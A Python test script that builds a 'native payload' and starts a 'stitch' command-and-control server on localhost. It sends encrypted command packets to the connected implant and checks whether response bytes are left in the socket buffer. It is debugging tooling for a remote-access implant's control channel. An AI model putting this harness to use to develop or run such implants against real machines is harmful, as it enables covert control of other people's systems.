#!/usr/bin/env python3
"""Test if we're leaving data in the socket buffer"""

import os, sys, time, threading, subprocess, signal, socket
sys.path.insert(0, '/workspace')

c2_port = 17300

# Compile
os.chdir('/workspace/native_payloads')
env = os.environ.copy()
env['C2_HOST'] = '127.0.0.1'
env['C2_PORT'] = str(c2_port)
subprocess.run(['bash', './build.sh'], capture_output=True, env=env, timeout=30)

def run_c2():
    from Application import stitch_cmd
    server = stitch_cmd.stitch_server()
    server.l_port = c2_port
    server.run_server()
c2_thread = threading.Thread(target=run_c2, daemon=True)
c2_thread.start()
time.sleep(3)

payload_proc = subprocess.Popen(['/workspace/native_payloads/output/payload_native'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, preexec_fn=os.setsid)
time.sleep(5)

from web_app_real import get_stitch_server
server = get_stitch_server()
target_id = list(server.inf_sock.keys())[0]
sock = server.inf_sock[target_id]

print('Testing response consumption...')

# Check if there's any data waiting in the socket buffer
sock.setblocking(False)
try:
    leftover = sock.recv(4096, socket.MSG_PEEK)
    if leftover:
        print(f'⚠️  WARNING: {len(leftover)} bytes already in buffer!')
        print(f'   Data: {leftover[:50].hex()}')
    else:
        print('✅ Buffer is clean')
except BlockingIOError:
    print('✅ Buffer is clean (no data)')
except Exception as e:
    print(f'Error checking buffer: {e}')

sock.setblocking(True)

# Send command 1 and see what happens
print('\nSending command 1...')
from native_protocol_bridge import native_bridge

try:
    packet = native_bridge.create_command_packet(0x01, b'')
    native_bridge._encrypt_and_send(sock, packet)
    print('  Sent successfully')
    
    # Wait a moment for response
    time.sleep(1)
    
    # Check buffer again
    sock.setblocking(False)
    try:
        data_waiting = sock.recv(4096, socket.MSG_PEEK)
        if data_waiting:
            print(f'  Response in buffer: {len(data_waiting)} bytes')
            print(f'  First 20 bytes: {data_waiting[:20].hex()}')
            
            # Try to read and parse it
            sock.setblocking(True)
            response = native_bridge.receive_response(sock)
            print(f'  Parsed response: {len(response) if response else 0} bytes')
            
            # Check if anything left
            sock.setblocking(False)
            leftover = sock.recv(4096, socket.MSG_PEEK)
            if leftover:
                print(f'  ⚠️  WARNING: {len(leftover)} bytes still in buffer!')
            else:
                print(f'  ✅ Buffer clean after reading response')
        else:
            print('  No response in buffer')
    except BlockingIOError:
        print('  No response in buffer')
    except Exception as e:
        print(f'  Error: {e}')
        
except Exception as e:
    print(f'  Failed: {e}')

sock.setblocking(True)

# Try command 2
print('\nSending command 2...')
try:
    packet = native_bridge.create_command_packet(0x01, b'')
    native_bridge._encrypt_and_send(sock, packet)
    print('  ✅ Sent successfully')
except Exception as e:
    print(f'  ❌ Failed: {e}')

try:
    os.killpg(os.getpgid(payload_proc.pid), signal.SIGKILL)
except:
    pass
